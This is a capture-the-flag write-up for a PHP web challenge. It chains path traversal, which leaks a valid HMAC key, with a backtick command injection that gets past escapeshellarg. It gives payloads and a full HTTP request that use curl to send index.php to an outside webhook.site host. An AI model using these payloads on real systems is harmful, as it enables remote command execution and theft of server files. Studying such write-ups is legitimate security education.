## Emoji

Ok so we have the following php code to bypass:

```php
<?php
        $secret = "*REDACTED*";
        $flag   = "3k{*REDACTED*}";

        function fetch_and_parse($page){
                $a=file_get_contents("https://raw.githubusercontent.com/3kctf2021webchallenge/downloader/master/".$page.".html");
                preg_match_all("/<img src=\"(.*?)\">/", $a,$ma);
                return $ma;
        }

        $url = @$_GET['url'];
        $key = @$_GET['key'];
        $dir = @$_GET['dir'];
        if($dir){
                $emojiList = fetch_and_parse($dir);
        }elseif ($url AND $key) {
                if($key === hash_hmac('sha256', $url, $secret)){
                        $d = "bash -c \"curl -o /dev/null ".escapeshellarg("https://raw.githubusercontent.com/3kctf2021webchallenge/downloader/master/".$url)."  \"";
                        exec($d);
                        echo '<script>alert("file download requested");</script>';      
                }else{
                        echo '<script>alert("incorrect download key");</script>';
                }

        }


?>
``` 

### Part 1

Since we need to generate a valid sha256 we need to first create a repo in git, then place a file like test.html with an image like:
```
<img src=" ; curl https://webhook.site/7448b9f1-9cdd-416c-8d0f-5b56d8424e3a">
```

The contents inside the src will be the payload for the second part.
In order to grab the file contents in order to generate a valid hmac we need to send the following request:

`GET /?dir=../../../<your_user>/<repo_name>/refs/heads/master/test HTTP/1.1`

It will then generate a key that will then be used in the second part.

Note: tried timing attacks for the hmac function but didnt sucessed

### Part 2 - Bypass escapeshellarg

So we have a way to get our payload in the curl command but we cant use a common command injection because it has a php function that escapes special characters. Meaning that any special character will be replace with `\<special_Char>`.

Well that was what i thought but its wrong the character `\`` is not escaped and allows to run another command inside it. 
Like: 

```
`curl https://webhook.site/7448b9f1-9cdd-416c-8d0f-5b56d8424e3a`
```

So, since we want to exfiltrate the infex.php we change the html with the following:

```html
<img src=" `curl https://webhook.site/7448b9f1-9cdd-416c-8d0f-5b56d8424e3a -d @index.php`">
```

The following http payload for this specific url is: 

```
GET /?url=%20`curl%20https://webhook.site/7448b9f1-9cdd-416c-8d0f-5b56d8424e3a%20-d%20@index.php`&key=fdc1712b1fe8a6c46f1c035018d37465a59adeb917b361d570ea2ee79fed1b7a HTTP/1.1
```

After accessing webhook.site we see that the data body has the contents:

![alt text](image.png)

Flag: `flag{bbbf197270485722f0cd7d44911ea74e}`

This was the comment that gave the answer: https://www.php.net/manual/en/function.escapeshellarg.php#66430

I found a github resource that has a couple of payload to bypass this functions: https://github.com/kacperszurek/exploits/blob/master/GitList/exploit-bypass-php-escapeshellarg-escapeshellcmd.md

